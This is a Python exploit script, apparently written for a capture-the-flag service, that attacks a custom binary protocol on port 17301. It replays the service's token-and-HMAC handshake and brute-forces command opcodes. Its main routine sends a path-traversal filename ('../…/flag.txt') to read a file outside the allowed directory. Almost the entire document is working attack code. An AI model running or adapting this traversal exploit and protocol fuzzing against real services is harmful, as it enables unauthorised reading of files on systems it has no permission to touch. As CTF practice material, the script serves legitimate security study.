import hmac
import hashlib
import socket
from struct import pack
import sys
from time import sleep
import os

PORT = 17301
p8 = lambda x : pack("!B", x)
p16 = lambda x : pack("!H", x)
p32 = lambda x : pack("!L", x)
p64 = lambda x : pack("!Q", x)

def get_rnd_token():
    return os.urandom(12)

def read_flag(args):
    # write file by code from client
    sock = socket.socket()
    sock.settimeout(5)

    try:
        sock.connect((args[1], PORT))
    except socket.timeout:
        exit(-1)

    token = get_rnd_token()

    sock.send(b"\x4e\x46\x00\x00\x00\x0c" + token)
    sleep(0.2)
    sock.send(b"\x4e\x46\x01\x10")
    a = hmac.new(hashlib.md5(token).digest(), 
        sock.recv(1024)[5:], hashlib.sha256).digest()

    # send response (hmac)
    sock.send(b"\x4e\x46\x01\x12\x00\x20" + a)
    sock.recv(1024)

    # try to read file
    sock.send(b"\x4e\x46\x05\x51" + b"../cfbfa0607dc4e1903191d181e37d0f34/flag.txt".ljust(64, b'\x00') + p32(0x00) + p16(0x40))
    print(sock.recv(1024))
   
def try_to_get_another_stat(args):
    # write file by code from client
    sock = socket.socket()
    sock.settimeout(5)

    try:
        sock.connect((args[1], PORT))
    except socket.timeout:
        exit(-1)

    token = get_rnd_token()

    sock.send(b"\x4e\x46\x00\x00\x00\x0c" + token)
    sleep(0.2)
    sock.send(b"\x4e\x46\x01\x10")
    a = hmac.new(hashlib.md5(token).digest(), 
        sock.recv(1024)[5:], hashlib.sha256).digest()

    # send response (hmac)
    sock.send(b"\x4e\x46\x01\x12\x00\x20" + a)
    sock.recv(1024)

    # write file by code from client
    sock.send(b"\x4e\x46\x06\x64" + b"testfilename".ljust(64, b'\x00') + p32(0x40))
    sock.send(b"\x4e\x46\x06\x61" + p16(70 + 0x40) + b"testfilename".ljust(64, b'\x00') + p32(0x0) + p16(0x40) + b'a'*0x40)
    sock.recv(1024)

    # test file but another command type sended
    sock.send(b"\x4e\x46\x04\x41" + b"testfilename".ljust(64, b'\x00'))
    
    print(sock.recv(1024))

def test_read_file(args):
    # write file by code from client
    sock = socket.socket()
    sock.settimeout(5)

    try:
        sock.connect((args[1], PORT))
    except socket.timeout:
        exit(-1)

    token = get_rnd_token()

    sock.send(b"\x4e\x46\x00\x00\x00\x0c" + token)
    #print(sock.recv(1024))
    sleep(0.2)
    sock.send(b"\x4e\x46\x01\x10")
    a = hmac.new(hashlib.md5(token).digest(), 
        sock.recv(1024)[5:], hashlib.sha256).digest()

    # send response (hmac)
    sock.send(b"\x4e\x46\x01\x12\x00\x20" + a)
    print(sock.recv(1024))
        
    # write file by code from client
    sock.send(b"\x4e\x46\x06\x64" + b"testfilename".ljust(64, b'\x00') + p32(0x40))
    sock.send(b"\x4e\x46\x06\x61" + p16(70 + 0x40) + b"testfilename".ljust(64, b'\x00') + p32(0x0) + p16(0x40) + b'a'*0x40)
    print(sock.recv(1024))

    # try to read file
    sock.send(b"\x4e\x46\x05\x51" + b"testfilename".ljust(64, b'\x00') + p32(0x00) + p16(0x40))
    print(sock.recv(1024))

def found_cmd_types(args):
    for j in [6]: # 0, 1, 4, 5, 6
        for i in range(0, 256):
            sock = socket.socket()
            sock.settimeout(5)
            try:
                sock.connect((args[1], PORT))
            except socket.timeout:
                exit(-1)

            token = get_rnd_token()

            sock.send(b"\x4e\x46\x00\x00\x00\x0c" + token)
            sleep(0.2)
            sock.send(b"\x4e\x46\x01\x10")
            a = hmac.new(hashlib.md5(token).digest(), 
                sock.recv(1024)[5:], hashlib.sha256).digest()

            # send response (hmac)
            sock.send(b"\x4e\x46\x01\x12\x00\x20" + a)
            sock.recv(1024)

            sock.send(b"\x4e\x46" + bytes([j, i]) )
            data = sock.recv(1024)

            if data[-1] != 0x3:
                print(j, i, data)

            sock.close()

            # 0 0
            # 1 0x10
            # 1 0x12
            # 4 0x41
            # 4 0x42
            # 5 0x51
            # 6 0x61
            # 6 0x64

def found_base_class(args):
    for i in range(0, 256):
            sock = socket.socket()
            sock.settimeout(5)
            try:
                sock.connect((args[1], PORT))
            except socket.timeout:
                exit(-1)

            token = get_rnd_token()

            sock.send(b"\x4e\x46\x00\x00\x00\x0c" + token)
            sleep(0.2)
            sock.send(b"\x4e\x46\x01\x10")
            a = hmac.new(hashlib.md5(token).digest(), 
                sock.recv(1024)[5:], hashlib.sha256).digest()

            # send response (hmac)
            sock.send(b"\x4e\x46\x01\x12\x00\x20" + a)
            sock.recv(1024)

            # create file
            sock.send(b"\x4e\x46" + bytes([i]) + b"\xff")
            data = sock.recv(1024)

            if data[-1] != 0x5:
                print("Possible cmd: {}, packet = {}".format(i, data))

            # get CMD-s: 0, 1, 4, 5, 6
            # 0 -> used for token send
            # 1 -> used for hmac send
            # 4 -> get file size by name
            # 5 -> Undef (for this moment)
            # 6 -> create and write file data

def main(args):
    read_flag(args)

if __name__ == "__main__":
    main(sys.argv)